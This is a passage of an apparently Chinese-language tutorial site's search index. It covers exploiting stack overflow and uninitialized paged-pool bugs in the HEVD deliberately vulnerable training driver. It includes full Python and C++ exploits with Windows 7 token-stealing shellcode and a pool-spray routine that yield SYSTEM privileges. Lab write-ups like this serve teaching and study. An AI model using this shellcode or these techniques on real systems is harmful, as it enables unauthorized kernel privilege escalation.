\u9996\u5148\u63d2\u4e2a\u9898\u5916\u8bdd\uff0c\u660e\u660e\u6211\u4eec\u7684 exp \u662f\u7528 python \u7f16\u5199\u7684\u4e3a\u4ec0\u4e48\u8fd9\u91cc\u7684 shellcode \u662f c ? \u56e0\u4e3a\u6211\u4eec\u7684 shellcode \u6700\u7ec8\u662f\u8981\u8f6c\u5316\u4e3a\u5b57\u8282\u7684\u5f62\u5f0f\u7684\uff0c\u7136\u540e\u6211\u628a\u6c47\u7f16\u4ee3\u7801\u8f6c\u5316\u4e3a\u5b57\u8282\u7684\u5f62\u5f0f\u662f\u4f7f\u7528 VS \u7684 debug \u7a97\u53e3\u6765\u505a\u5230\u7684 \u50cf\u8fd9\u6837\u4e00\u4e2a byte \u4e00\u4e2a byte \u5730\u590d\u5236\u7c98\u8d34\u51fa\u6765\uff0c\u4e2a\u4eba\u611f\u89c9\u8fd9\u79cd\u505a\u6cd5\u5f88\u4f4e\u6548\uff0c\u4e0d\u77e5\u9053\u5e08\u5085\u4eec\u6709\u6ca1\u6709\u4ec0\u4e48\u597d\u7528\u7684\u65b9\u6cd5\u5462? shellcode \u7684\u4ee3\u7801\u4e0d\u957f\uff0c\u8fd9\u91cc\u5c31\u89e3\u91ca\u4e00\u4e0b\u6574\u6bb5\u4ee3\u7801\u3002 \u9996\u5148\u770b\u8fd9\u4e00\u6bb5\u3002\u5728\u5185\u6838\u6a21\u5f0f\u4e0b\uff0c fs\u5bc4\u5b58\u5668\u6307\u5411 PCR(Processor Control Region)\uff0c\u5176\u6570\u636e\u7ed3\u6784\u4e3a KPCR\u3002\u6211\u4eec\u53ef\u4ee5\u5728 windbg \u4e2d\u770b\u5230\u5176\u5177\u4f53\u7ed3\u6784 \uff08\u4e0b\u6587\u7684\u6240\u6709\u6570\u636e\u7ed3\u6784\u540c\u7406\uff0c\u6211\u5c31\u4e0d\u4e00\u4e00\u8d34\u56fe\u4e86\uff0c\u6bd4\u5982KTHREAD\u7684\u67e5\u770b\u65b9\u6cd5\u4e3a dt _kthread \uff09 \u53ef\u4ee5\u770b\u5230\uff0c\u5728 fs:[0x124] \u7684\u4f4d\u7f6e\u5b58\u653e\u7684\u503c\u662f CurrentThread\uff0c\u5176\u6570\u636e\u7ed3\u6784\u4e3a KTHREAD \u7136\u540e KTHREAD.ApcState.Process \u6307\u5411\u7684\u662f KPREOCESS \u7ed3\u6784\uff0c\u6240\u4ee5\u6700\u540e eax \u7684\u503c\u6307\u5411\u5f53\u524d\u8fdb\u7a0b\u7684 EPROCESS \u7ed3\u6784\uff08\u8fd9\u91cc\u89e3\u91ca\u4e00\u4e0b\uff0cKTHREAD.ApcState.Process \u786e\u5b9e\u662f\u6307\u5411 KPROCESS \u6ca1\u9519\uff0c\u4f46\u662f\u56e0\u4e3a KPROCESS \u662f EPROCESS \u7ed3\u6784\u4f53\u4e2d\u7684\u7b2c\u4e00\u4e2a\u6210\u5458\uff0c\u6240\u4ee5 KPROCESS \u548c EPROCESS \u7684\u8d77\u59cb\u5730\u5740\u5176\u5b9e\u662f\u4e00\u6837\u7684\uff09 ActiveProcessLinks \u662f\u4e00\u4e2a\u53cc\u94fe\u8868\u8282\u70b9\uff0c\u5728 Windwos \u4e2d\uff0c\u6240\u6709\u7684\u6d3b\u52a8\u8fdb\u7a0b\u90fd\u8fde\u63a5\u5728\u4e00\u8d77\uff0c\u6784\u6210\u4e00\u4e2a\u53cc\u94fe\u8868\u3002\u5f53\u4e00\u4e2a\u8fdb\u7a0b\u88ab\u521b\u5efa\u65f6\uff0c\u5176 ActiveProcessLinks \u57df\u5c06\u88ab\u4f5c\u4e3a\u8282\u70b9\u52a0\u5165\u5230\u6b64\u94fe\u8868\u4e2d\u3002\u800c\u5176\u4e2d Flink \u662f\u6307\u5411\u8f83\u65e9\u52a0\u5165\u7684\u8fdb\u7a0b\u7684\u3002 \u6240\u4ee5\u8fd9\u6bb5\u4ee3\u7801\u7684\u5927\u81f4\u610f\u601d\u5c31\u662f\u4e0d\u65ad\u5730\u5f80\u524d\u627e\uff0c\u76f4\u5230\u627e\u5230\u4e00\u4e2a\u8fdb\u7a0b\u7684 PID \u4e3a 4\uff08SYSTEM \u8fdb\u7a0b\u7684 PID\uff09\uff0c\u53d6\u51fa\u5b83\u7684 Token \u503c\u5e76\u5c06\u8fd9\u4e2a Token \u503c\u590d\u5236\u7ed9\u6211\u4eec\u7684\u8fdb\u7a0b\u3002 \u6700\u540e\u8fd9\u6bb5\u4ee3\u7801\u662f\u7528\u6765\u8fd8\u539f\u6307\u4ee4\u6d41\u7684\u3002\uff08\u540c\u65f6\u4f7f\u88ab\u6211\u4eec\u63a7\u5236\u7684esp \u548c ebp \u56de\u5230\u6b63\u5e38\u7684\u503c\uff0c\u7f6e\u8fd4\u56de\u503c\u4e3a STATUS_UNSUCCESSFUL\uff09 \u770b\u5230\u8fd9\u6bb5\u6c47\u7f16\u6307\u4ee4\u3002\u672c\u6765 TriggerBufferOverflowStack \u51fd\u6570\u7684 ret \u662f\u8981\u56de\u5230 BufferOverflowStackIoctlHandler \u4e2d\u7684 mov [ebp+Status], eax \u7684\u3002\u4f46\u662f\u88ab\u6211\u4eec\u63a7\u5236\u4e86 eip \u5230\u4e86\u6211\u4eec\u7684 shellcode\u3002\u6240\u4ee5\u82e5\u6211\u4eec\u60f3\u8ba9\u6307\u4ee4\u56de\u5230\u6b63\u5e38\uff0c\u53ea\u9700\u8981\u5728shellcode\u7684\u6700\u540e\u505a\u8ddf\u539f\u6765\u4e00\u6837\u7684\u64cd\u4f5c\uff0c\u5c31\u80fd\u6b63\u5e38\u5730\u8fd4\u56de\u5230 IrpDeviceIoCtlHandler \u4e2d\u3002 \u56e0\u6b64\uff0c\u6211\u4eec\u5e94\u8be5 \u4f7f eax \u503c\u7b49\u4e8e STATUS_UNSUCCESSFUL\uff0c\u4e5f\u5c31\u662f 0 add esp, 20\u3002\u4e3a\u4ec0\u4e48\u8fd9\u91cc\u6211\u4eec\u4e0d\u80fd mov esp, ebp\u5462\uff1f\u56e0\u4e3a\u8fd9\u91cc\u7684 ebp \u88ab\u6211\u4eec\u63a7\u5236\u6210 0x41414141 \u4e86\u3002\u5e76\u4e0d\u6307\u5411\u539f\u6765\u7684 old ebp\u3002\u90a3\u8fd9\u91cc\u5177\u4f53\u5e94\u8be5\u4f7f esp \u52a0\u591a\u5c11\u5c31\u8981\u770b\u539f\u6765\u6b63\u5e38\u7684\u6307\u4ee4\u5230\u4e86 call _TriggerBufferOverflowStack \u65f6 ebp \u548c esp \u76f8\u5dee\u591a\u5c11\u4e86\u3002\u5047\u8bbe\u8fd9\u65f6\u5019 ebp \u548c esp \u76f8\u5dee 0x16\uff0c\u90a3\u4e48\u6211\u4eec add esp, x \u4e2d\u7684 x \u5c31\u7b49\u4e8e 0x20\uff08\u56e0\u4e3a call \u6307\u4ee4\u4f1a\u6267\u884c\u4e00\u6761 push eip \u4f7f esp \u4ea7\u751f 4 \u7684\u79fb\u52a8\uff0c\u5e76\u4e14 shellcode \u5168\u7a0b\u5e76\u6ca1\u6709\u4f7f esp \u4ea7\u751f\u79fb\u52a8\uff09\u6211\u4eec\u53ef\u4ee5\u901a\u8fc7 windbg \u6765\u5f97\u5230\u8fd9\u4e2a\u6570\u503c \u6700\u540e\u5c31\u662f pop ebp;ret 8","title":"\u4e00\u4e2a\u53ef\u4ee5\u6267\u884c\u7684\u7a7a\u95f4\uff0c\u91cc\u9762\u5305\u542b\u7740\u6211\u4eec\u7684 shellcode"},{"location":"HEVD/stackoverflow/#shellcode_1","text":"\u8fd9\u4e2a\u5f88\u7b80\u5355\uff0c\u53ea\u9700\u8981\u63a7\u5236 eip \u6307\u5411\u6211\u4eec\u7684 shellcode \u7684\u5730\u5740\u5c31\u597d\u4e86","title":"\u4f7f\u6307\u4ee4\u6d41\u6307\u5411\u6211\u4eec\u7684 shellcode"},{"location":"HEVD/stackoverflow/#0x03-hevd","text":"\u6839\u636e\u4ee5\u4e0a\u7684\u5206\u6790\u6211\u89c9\u5f97\u8fd9\u91cc\u5e94\u8be5\u4e0d\u7528\u518d\u89e3\u91ca\u4e86\uff0c\u8fd9\u91cc\u76f4\u63a5\u7ed9\u51fa exp \u5e76\u770b\u4e00\u4e0b\u5b83\u7684\u8fd0\u884c\u7ed3\u679c #coding=utf-8 import ctypes , sys , struct from ctypes import * from subprocess import * kernel32 = windll . kernel32 # 0xC0000000 \u524d\u56db\u4f4d\u4e3a 1100,\u7b49\u540c\u4e8eGENERIC_READ | GENERIC_WRITE,\u5373\u8bfb\u5199\u6743\u9650 # 0x3 \u4e3a 0011,\u7b49\u540c\u4e8eFILE_ATTRIBUTE_READONLY | FILE_ATTRIBUTE_HIDDEN,\u5373\u53ea\u8bfb\u548c\u9690\u85cf\u5c5e\u6027 hevDevice = kernel32 . CreateFileA ( \\\\\\\\ . \\\\ HackSysExtremeVulnerableDriver , 0xC0000000 , 0 , None , 0x3 , 0 , None ) if not hevDevice or hevDevice == - 1 : print *** Couldn t get Device Driver handle. sys . exit ( 0 ) shellcode = shellcode += bytearray ( \\x60 # pushad \\x33\\xC0 # xor eax,eax \\x64\\x8B\\x80\\x24\\x01\\x00\\x00 # mov eax,dword ptr fs:[eax+124h] \\x8B\\x40\\x50 # mov eax,dword ptr [eax+50h] \\x8B\\xC8 # mov ecx,eax \\xBA\\x04\\x00\\x00\\x00 # mov edx,4 \\x8B\\x80\\xB8\\x00\\x00\\x00 # mov eax,dword ptr [eax+0B8h] \\x2D\\xB8\\x00\\x00\\x00 # sub eax,0B8h \\x39\\x90\\xB4\\x00\\x00\\x00 # cmp dword ptr [eax+0B4h],edx \\x75\\xED # jne SearchSystemPID \\x8B\\x90\\xF8\\x00\\x00\\x00 # mov edx,dword ptr [eax+0F8h] \\x89\\x91\\xF8\\x00\\x00\\x00 # mov dword ptr [ecx+0F8h],edx \\x61 # popad \\x33\\xC0 # xor eax,eax \\x83\\xC4\\x14 # add esp,14h \\x5D # pop ebp \\xC2\\x08\\x00 # ret 8 ) # 0x3000 \u7b49\u540c\u4e8eMEM_COMMIT | MEM_RESERVE, \u5373\u9884\u7559\u5e76\u63d0\u4ea4\u8be5\u5757\u5185\u5b58 # 0x40 \u6307\u793a\u4e86\u5206\u914d\u7684\u9875\u9762\u7684\u4fdd\u62a4\u5c5e\u6027,\u5176\u503c\u7b49\u540c\u4e8ePAGE_EXECUTE_READWRITE,\u5373\u53ef\u8bfb\u53ef\u5199\u53ef\u6267\u884c ptr = kernel32 . VirtualAlloc ( c_int ( 0 ), c_int ( len ( shellcode )), c_int ( 0x3000 ), c_int ( 0x40 )) buff = ( c_char * len ( shellcode )) . from_buffer ( shellcode ) # \u628ashellcode \u590d\u5236\u5230\u5206\u914d\u7684\u5185\u5b58\u4e2d kernel32 . RtlMoveMemory ( c_int ( ptr ), buff , c_int ( len ( shellcode ))) shellcode_final = struct . pack ( L , ptr ) buf = A * 2092 + shellcode_final bufLength = len ( buf ) kernel32 . DeviceIoControl ( hevDevice , 0x222003 , buf , bufLength , None , 0 , byref ( c_ulong ()), None ) Popen ( start cmd , shell = True ) \u8fd0\u884c\u7ed3\u679c\u5982\u56fe\u6240\u793a","title":"0x03 HEVD \u6808\u6ea2\u51fa\u6f0f\u6d1e\u5229\u7528"},{"location":"HEVD/stackoverflow/#0x04","text":"\u4ece\u4e0b\u4e00\u7bc7\u5f00\u59cb\u5c06\u4f1a\u4fa7\u91cd\u4e8e\u5bf9\u6f0f\u6d1e\u8fdb\u884c\u5206\u6790\u5229\u7528\u3002 2019.8.28","title":"0x04 \u7ed3\u675f\u8bed"},{"location":"HEVD/uninitializedHeapVariable/","text":"\u8f6c\u8f7d\u8bf7\u6ce8\u660e\u51fa\u5904\u54e6 : ) 0x00 \u524d\u8a00 \u672c\u7bc7\u7684\u5185\u5bb9\u4e3a\u672a\u521d\u59cb\u5316\u6362\u9875\u6c60\u53d8\u91cf\u6f0f\u6d1e\u5206\u6790\u5229\u7528\uff08Uninitialized Heap Variable\uff09 0x01 \u672a\u521d\u59cb\u5316\u5806\u53d8\u91cf\u6f0f\u6d1e\u5206\u6790 \u9996\u5148\u6253\u5f00 UninitializedMemoryPagedPool.c \u6587\u4ef6 \u903b\u8f91\u8fd8\u662f\u5f88\u6e05\u6670\u7684\uff0c\u82e5\u6211\u4eec\u7684\u8f93\u5165\u4e0d\u7b49\u4e8e MagicValue\uff0c\u5c31\u4f1a\u76f4\u63a5\u5bf9\u6ca1\u6709\u521d\u59cb\u5316\u7684\u6362\u9875\u6c60\u8fdb\u884c\u8c03\u7528\u3002 \u5c31\u50cf\u6211\u4eec\u5728\u672a\u521d\u59cb\u5316\u5185\u6838\u6808\u53d8\u91cf\u5229\u7528\u4e2d\u6240\u7528\u7684\u65b9\u6cd5\u4e00\u6837\uff0c\u82e5\u6211\u4eec\u53ef\u4ee5\u4f7f\u8fd9\u4e2a\u672a\u521d\u59cb\u5316\u7684\u6362\u9875\u6c60\u586b\u6ee1\uff08\u540e\u9762\u53ef\u4ee5\u77e5\u9053\uff0c\u6211\u4eec\u4e0d\u9700\u8981\u7528\u55b7\u5c04\u7684\u65b9\u6cd5\uff0c\u56e0\u4e3a\u8fd9\u6b21\u6211\u4eec\u53ef\u4ee5\u7cbe\u786e\u5730\u63a7\u5236\u8fd9\u4e2a\u6362\u9875\u6c60\u7684\u5185\u5bb9\uff09\u6211\u4eec\u7684 shellcode \u7684\u5730\u5740\uff0c\u90a3\u4e48\u4e4b\u540e\u53d1\u751f UninitializedMemory- Callback() \u7684\u65f6\u5019\u5c31\u4f1a\u6267\u884c\u6211\u4eec\u7684 shellcode \u4e86\u3002 \u90a3\u4e48\u6211\u4eec\u6709\u4ec0\u4e48\u529e\u6cd5\u53ef\u4ee5\u63a7\u5236 UninitializedMemory \u7533\u8bf7\u7684\u6362\u9875\u6c60\u7684\u810f\u5185\u5bb9\u5462\uff1f \u8fd9\u91cc\u6211\u4eec\u53ef\u4ee5\u7528\u5230 Lookaside List\uff08\u540e\u5907\u5217\u8868 | \u5feb\u67e5\u8868 | \u65c1\u89c6\u5217\u8868\uff09\uff0c\u5bf9\u4e8e Lookaside List \u662f\u4ec0\u4e48\u6709\u4e0d\u6e05\u695a\u7684\u53ef\u4ee5 \u9605\u8bfb\u4e00\u4e0b\u8fd9\u7bc7\u6587\u7ae0 \uff0c\u6211\u4e2a\u4eba\u89c9\u5f97\u67e5\u5f97\u5230\u7684\u8d44\u6599\u91cc\u5e94\u8be5\u7b97\u5199\u5f97\u4e0d\u9519\u7684\u4e86 \uff1a ) \u8fd9\u91cc\u4e5f\u518d\u5927\u6982\u89e3\u91ca\u4e00\u4e0b\u4ec0\u4e48\u662f Lookaside List \u9996\u5148\uff0c\u5728\u8fdb\u7a0b\u63a7\u5236\u5757\uff08KPRCB\uff09\u91cc\u4fdd\u5b58\u7740\u8fd9\u4e48\u4e00\u4e2a\u7ed3\u6784 GENERAL_LOOKASIDE \u7684\u7ed3\u6784\u4e3a\uff08\u8fd9\u91cc\u4f60\u80fd\u53d1\u73b0 Windows \u672a\u6587\u6863\u5316\u7684\u5f88\u591a\u540d\u5b57\u5728\u4e0d\u540c\u7684\u5730\u65b9\u6216\u591a\u6216\u5c11\u90fd\u6709\u70b9\u533a\u522b\uff0c\u6bd5\u7adf Windows \u662f\u95ed\u6e90\u7684\uff0c\u4f60\u53ea\u8981\u77e5\u9053\u5b83\u4eec\u8bf4\u7684\u662f\u540c\u4e00\u4e2a\u4e1c\u897f\u5c31\u597d\u4e86\uff09 typedef struct _GENERAL_LOOKASIDE { union { SLIST_HEADER ListHead ; SINGLE_LIST_ENTRY SingleListHead ; }; WORD Depth ; WORD MaximumDepth ; ULONG TotalAllocates ; union { ULONG AllocateMisses ; ULONG AllocateHits ; }; ULONG TotalFrees ; union { ULONG FreeMisses ; ULONG FreeHits ; }; POOL_TYPE Type ; ULONG Tag ; ULONG Size ; union { PVOID * AllocateEx ; PVOID * Allocate ; }; union { PVOID FreeEx ; PVOID Free ; }; LIST_ENTRY ListEntry ; ULONG LastTotalAllocates ; union { ULONG LastAllocateMisses ; ULONG LastAllocateHits ; }; ULONG Future [ 2 ]; } GENERAL_LOOKASIDE , * PGENERAL_LOOKASIDE ; \u6bcf\u4e00\u4e2a GENERAL_LOOKASIDE \u90fd\u662f\u4e00\u6761 Lookaside List\uff0c\u6240\u6709\u7684 GENERAL_LOOKASIDE \u7528\u53cc\u5411\u94fe\u8868\u4e32\u8d77\u6765\uff0c\u5176\u4e2d SINGLE_LIST_ENTRY SingleListHead \u662f\u4e00\u6761\u5177\u6709\u76f8\u540c\u5927\u5c0f\u7684\u7a7a\u95f2\u6362\u9875\u6c60\u5355\u5411\u94fe\u8868 WORD MaximumDepth \u662f\u5355\u5411\u94fe\u8868\u7684\u6700\u5927\u6df1\u5ea6\uff0c\u9ed8\u8ba4\u503c\u4e3a 256 LIST_ENTRY ListEntry \u5c31\u662f GENERAL_LOOKASIDE \u53cc\u5411\u94fe\u8868 \u5176\u7ed3\u6784\u5927\u81f4\u50cf\u8fd9\u4e2a\u6837\u5b50\uff08\u5e7c\u513f\u56ed\u753b\u5e08\u6765\u4e86\uff09 \u8bf4\u5b8c\u4e86 Lookaside List \u7684\u7ed3\u6784\u4e86\uff0c\u90a3\u4e48\u518d\u8bf4\u8bf4 Lookaside List \u662f\u4ec0\u4e48 \u7531\u4e8e\u8c03\u7528\u5185\u5b58\u7ba1\u7406\u5668\u6765\u8fdb\u884c\u5206\u914d\u5185\u5b58\u662f\u4e00\u4ef6\u76f8\u5bf9\u6765\u8bf4\u6bd4\u8f83\u8017\u65f6\u7684\u64cd\u4f5c\uff0c\u82e5\u6211\u4eec\u9891\u7e41\u5730\u4f7f\u7528\u5185\u5b58\u7ba1\u7406\u5668\u5bf9\u5c0f\u5757\u5185\u5b58\u8fdb\u884c\u5206\u914d\u91ca\u653e\uff0c\u90a3\u4e48\u8fd9\u4e2a\u64cd\u4f5c\u4f1a\u964d\u4f4e\u7cfb\u7edf\u7684\u6027\u80fd\u3002\u56e0\u6b64\uff0c\u540e\u5907\u5217\u8868\uff08Lookaside List\uff09\u63d0\u4f9b\u4e86\u4e00\u4e2a\u6bd4\u8f83\u7b80\u5355\u7684\u63d0\u9ad8\u5c0f\u5757\u5185\u5b58\u5206\u914d\u548c\u7533\u8bf7\u6548\u7387\u7684\u673a\u5236\uff0c\u540e\u5907\u5217\u8868\u7528\u6765\u8fdb\u884c\u56fa\u5b9a\u5927\u5c0f\u5185\u5b58\u5757\u7684\u5c0f\u5185\u5b58\u5757\u7684\u52a8\u6001\u7533\u8bf7\u548c\u91ca\u653e\u3002 \u7b80\u5355\u5730\u8bf4\uff0c\u5c31\u662f\u5f53\u6211\u4eec\u4f7f\u7528 ExAllocatePoolWithTag \u7533\u8bf7\u4e00\u4e2a\u5c0f\u5757\u5185\u5b58\u65f6\uff0c\u7cfb\u7edf\u4f1a\u9996\u5148\u5c1d\u8bd5\u4ece KPRCB \u4e2d\u7684 PP(N)PagedLookasideList \u5206\u914d\u5185\u5b58\u3002\u5728\u5206\u914d\u5185\u5b58\u65f6\uff0c\u540e\u5907\u5217\u8868\u4e2d\u7684\u5185\u5b58\u5757\u53ea\u63d0\u4f9b\u6ee1\u8db3\u5927\u5c0f\u7b26\u5408\u7684\u7533\u8bf7\uff0c\u5426\u5219\u4e0d\u4e88\u5904\u7406 \u518d\u770b\u5230\u6211\u4eec\u7684 UninitializedMemory \u7ed3\u6784\u3002 typedef struct _UNINITIALIZED_MEMORY_POOL { ULONG_PTR Value ; FunctionPointer Callback ; ULONG_PTR Buffer [ 58 ]; } UNINITIALIZED_MEMORY_POOL , * PUNINITIALIZED_MEMORY_POOL ; 4 + 4 + 58 * 4 + pool header = 248 256 \u6240\u4ee5\u8bf4\uff0cUninitializedMemory \u5c5e\u4e8e\u5c0f\u5757\u5185\u5b58\uff0c\u7cfb\u7edf\u4f1a\u9996\u5148\u5c1d\u8bd5\u4ece PPPagedLookasideList \u4e2d\u5206\u914d\u7533\u8bf7\u7684\u6362\u9875\u6c60\u3002 \u5230\u8fd9\u91cc\u5c31\u660e\u4e86\u4e86\uff0c\u6211\u4eec\u82e5\u4f7f PPPagedLookasideList \u4e2d\u586b\u6ee1\u6211\u4eec\u7684\u810f\u7a7a\u95f2\u5185\u5b58\u5757\uff0c\u7b49\u4f1a\u513f UninitializedMemory \u53c8\u4ece PPPagedLookasideList \u7533\u8bf7\u6362\u9875\u6c60\u5757\uff0c\u53d1\u751f\u672a\u521d\u59cb\u5316\u53d8\u91cf\u8c03\u7528\u7684\u65f6\u5019\uff0c\u5c31\u4f1a\u6267\u884c\u6211\u4eec\u7684 shellcode \u4e86\u3002 \u6700\u540e\u4e00\u4e2a\u95ee\u9898\uff0c\u6211\u4eec\u8be5\u600e\u4e48\u4f7f\u7a7a\u95f2\u5185\u5b58\u5757\u53d8\u810f\u5462\uff1f\u8fd8\u8bb0\u5f97\u6211\u4eec\u5728\u6c60\u6ea2\u51fa\u4e00\u7ae0\u4e2d\u4f7f\u7528\u7684\u51fd\u6570 CreateEvent \u5417\uff1f \u867d\u7136 CreateEvent \u5bf9\u8c61\u662f\u5728\u975e\u6362\u9875\u6c60\u4e2d\u7684\uff0c\u4f46\u662f\u5b83\u7684\u7b2c\u56db\u4e2a\u53c2\u6570 lpName \u5176\u5b9e\u662f\u4fdd\u5b58\u5728\u6362\u9875\u6c60\u4e2d\u7684\u3002\u5b83\u7684\u7c7b\u578b\u4e3a LPCSTR\uff0c\u8981\u63a7\u5236 256 \u4e2a\u5b57\u8282\u8fd8\u662f\u53ef\u4ee5\u505a\u5230\u7684\u3002 0x02 \u672a\u521d\u59cb\u5316\u5806\u53d8\u91cf\u6f0f\u6d1e\u5229\u7528 \u9996\u5148\u8fd8\u662f\u5148\u8d34\u4e0a exp // uninitializedHeapVariable.cpp : Defines the entry point for the console application. // #include stdafx.h #include windows.h /* char shellcode[] = { \\x90\\x90\\x90\\x90 // NOP Sled \\x60 // pushad \\x31\\xc0 // xor eax,eax \\x64\\x8b\\x80\\x24\\x01\\x00\\x00 // mov eax,[fs:eax+0x124] \\x8b\\x40\\x50 // mov eax,[eax+0x50] \\x89\\xc1 // mov ecx,eax \\xba\\x04\\x00\\x00\\x00 // mov edx,0x4 \\x8b\\x80\\xb8\\x00\\x00\\x00 // mov eax,[eax+0xb8] \\x2d\\xb8\\x00\\x00\\x00 // sub eax,0xb8 \\x39\\x90\\xb4\\x00\\x00\\x00 // cmp [eax+0xb4],edx \\x75\\xed // jnz 0x1a \\x8b\\x90\\xf8\\x00\\x00\\x00 // mov edx,[eax+0xf8] \\x89\\x91\\xf8\\x00\\x00\\x00 // mov [ecx+0xf8],edx \\x61 // popad \\xC3 // ret }; */ #define KTHREAD_OFFSET 0x124 // nt!_KPCR.PcrbData.CurrentThread #define EPROCESS_OFFSET 0x050 // nt!_ETHREAD.ApcState.Process #define PID_OFFSET 0x0B4 // nt!_EPROCESS.UniqueProcessId #define FLINK_OFFSET 0x0B8 // nt!_EPROCESS.ActiveProcessLinks.Flink #define TOKEN_OFFSET 0x0F8 // nt!_EPROCESS.Token #define SYSTEM_PID 0x004 // SYSTEM Process PID VOID shellCode () { __asm { nop ; nop ; nop ; nop ; pushad ; Save registers state ; Start of Token Stealing Stub xor eax , eax ; Set ZERO mov eax , fs :[ eax + KTHREAD_OFFSET ]; Get nt ! _KPCR . PcrbData . CurrentThread ; _KTHREAD is located at FS : [ 0x124 ] mov eax , [ eax + EPROCESS_OFFSET ]; Get nt ! _KTHREAD . ApcState . Process mov ecx , eax ; Copy current process _EPROCESS structure mov edx , SYSTEM_PID ; WIN 7 SP1 SYSTEM process PID = 0x4 SearchSystemPID : mov eax , [ eax + FLINK_OFFSET ]; Get nt ! _EPROCESS . ActiveProcessLinks . Flink sub eax , FLINK_OFFSET cmp [ eax + PID_OFFSET ], edx ; Get nt ! _EPROCESS . UniqueProcessId jne SearchSystemPID mov edx , [ eax + TOKEN_OFFSET ] ; Get SYSTEM process nt ! _EPROCESS . Token mov [ ecx + TOKEN_OFFSET ], edx ; Replace target process nt ! _EPROCESS . Token ; with SYSTEM process nt ! _EPROCESS . Token ; End of Token Stealing Stub popad ; Restore registers state ret ; } } int main () { printf ( shellcode address : 0x%p , shellCode ); WCHAR lpName [ 0xf0 / 2 ] = { 0 }; // \u56e0\u4e3a\u4e00\u4e2aUnicode\u662f2\u4e2a\u5b57\u8282 memset ( lpName , \\x41 , sizeof ( lpName )); for ( int i = 0 ; i 256 ; i ++ ) { * ( PDWORD )(( char * ) lpName + 4 ) = ( DWORD32 ) shellCode ; // \u8fd9\u91cc\u4e3a\u4ec0\u4e48\u8981\u5148 (char *)\uff0c\u56e0\u4e3a\u4e00\u4e2aWCHAR\u662f2\u4e2a\u5b57\u8282 // \u8981\u662f\u4e0d(char *)\u7684\u8bdd\u4f1a\u8dd1\u5230(char *)lpName + 8\u7684\u4f4d\u7f6e * ( PDWORD )(( char * ) lpName + 0xf0 - 4 ) = i ; } HANDLE spray [ 256 ] = { 0 }; for ( int i = 0 ; i 256 ; i ++ ) { spray [ i ] = CreateEventW ( NULL , FALSE , FALSE , ( LPCWSTR ) lpName ); } for ( int i = 0 ; i 256 ; i ++ ) { CloseHandle ( spray [ i ]); } int value = 0x1 ; int * payload = value ; HANDLE hevDevice = CreateFileA ( \\\\\\\\ . \\\\ HackSysExtremeVulnerableDriver , 0xC0000000 , 0 , NULL , 0x3 , 0 , NULL ); DWORD lpBytesReturned = 0 ; DeviceIoControl ( hevDevice , 0x222033 , payload , 0x4 , NULL , 0 , lpBytesReturned , NULL ); system ( whoami ); return 0 ; } \u8fd9\u91cc\u7a0b\u5e8f\u5927\u81f4\u5728\u505a\u4ec0\u4e48\u7ed3\u5408 0x01 \u5c0f\u8282\u6765\u770b\u5e94\u8be5\u8fd8\u662f\u5f88\u6e05\u6670\u7684\u3002\u53ea\u662f\u4ee3\u7801\u4e2d\u6709\u4e9b\u7ec6\u8282\u6211\u8981\u89e3\u91ca\u4e00\u4e0b \u4f7f\u7528 CreateEventW \u7684\u539f\u56e0 \u770b\u8fc7\u6211\u4e4b\u524d\u6587\u7ae0\u7684\u670b\u53cb\u5e94\u8be5\u53ef\u4ee5\u53d1\u73b0\u6211\u4e4b\u524d\u7684\u6587\u7ae0\u7528\u7684\u90fd\u662f char shellcode [] = {...} LPVOID ptr = VirtualAlloc ( 0 , , , ) RtlCopyMemory ( ptr , , ) \u8fd9\u79cd\u5f62\u5f0f\u6765\u4fdd\u5b58 shellcode \u7684\u3002\u4f46\u662f\u4f60\u53d1\u73b0\u6211\u8fd9\u6b21\u662f\u5c06 shellcode \u76f4\u63a5\u5199\u5728\u4ee3\u7801\u6bb5\u4e2d\u7684\u3002\u4e3a\u4ec0\u4e48\u5462\uff1f \u4f60\u82e5\u662f\u81ea\u5df1\u5c1d\u8bd5\u4e00\u4e0b\uff0c\u4f1a\u53d1\u73b0\u7528 VirtualAlloc \u5206\u914d\u7684\u5730\u5740\u5927\u81f4\u90fd\u662f 0x000d0000 \u8fd9\u6837\u7684\u683c\u5f0f\u7684\uff0c\u82e5\u662f\u81ea\u9876\u5411\u4e0b\u5206\u7684\u8bdd\u5927\u81f4\u90fd\u662f 0x74ef0000 \u8fd9\u6837\u7684\u683c\u5f0f\u7684\u3002\u4f46\u662f\u4f60\u770b\u6211\u4eec lpName \u53c2\u6570\u7c7b\u578b\u662f LPCSTR\u3002\u4f17\u6240\u5468\u77e5\u5b57\u7b26\u4e32\u9047\u5230 00 \u5c31\u76f4\u63a5\u622a\u65ad\u4e86\uff0c\u8fd9\u6837\u5b50\u6211\u4eec\u7684 payload \u6839\u672c\u65e0\u6cd5\u5b8c\u6574\u5730\u4f20\u4e0a\u53bb\u3002 \u90a3\u4e48\u600e\u4e48\u529e\u5462\uff1f \u7528 VirtualAlloc \u65f6\u6307\u5b9a\u57fa\u5730\u5740\u53ef\u884c\u5417\uff1f\u6309\u7406\u6765\u8bf4\u8fd9\u662f\u53ef\u884c\u7684\uff0c\u4f46\u662f\u7b2c\u4e00\u4e2a\u53c2\u6570\u9664\u4e86 0 \u8ba9\u7cfb\u7edf\u81ea\u52a8\u5206\u914d\u5916\uff0c\u6211\u5c31\u6ca1\u5206\u914d\u6210\u529f\u8fc7 emmmmm \u7528 Heap \u6765\u4fdd\u5b58 shellcode \u5462\uff1f\u5c1d\u8bd5\u4e86\u4e00\u4e0b\u9ed8\u8ba4\u5806\u7684\u5206\u914d\u5730\u5740\u5927\u81f4\u662f 0x00344290 \u8fd9\u6837\u7684\u683c\u5f0f\u7684\uff0c\u6ca1\u6709\u4e24\u4e2a\u8fde\u7eed\u5728\u4e00\u8d77\u7684 00\uff0c\u53ea\u8981\u628a\u5b57\u7b26\u7f16\u7801\u53d8\u6210 WCHAR \u5c31\u53ef\u4ee5\u4e86\u3002\u6240\u4ee5\u6309\u7406\u6765\u8bf4\u8fd9\u4e2d\u65b9\u6cd5\u53ef\u884c\uff0c\u4e0d\u8fc7\u6211\u81ea\u5df1\u6ca1\u8bd5\u8fc7 \u4e0d\u4fdd\u5b58 shellcode \u4e86\uff0c\u76f4\u63a5\u5c06 shellcode \u5199\u5728\u4ee3\u7801\u6bb5\u4e2d\uff0c\u8fd9\u65f6\u4f60\u4f1a\u53d1\u73b0 shellcode \u7684\u5730\u5740\u5927\u81f4\u662f 0x00df1000\u3002\u8fd8\u662f\u6ca1\u6709\u4e24\u4e2a\u8fde\u7eed\u5728\u4e00\u8d77\u7684 00\uff0c\u53ea\u8981\u628a\u5b57\u7b26\u7f16\u7801\u53d8\u6210 WCHAR 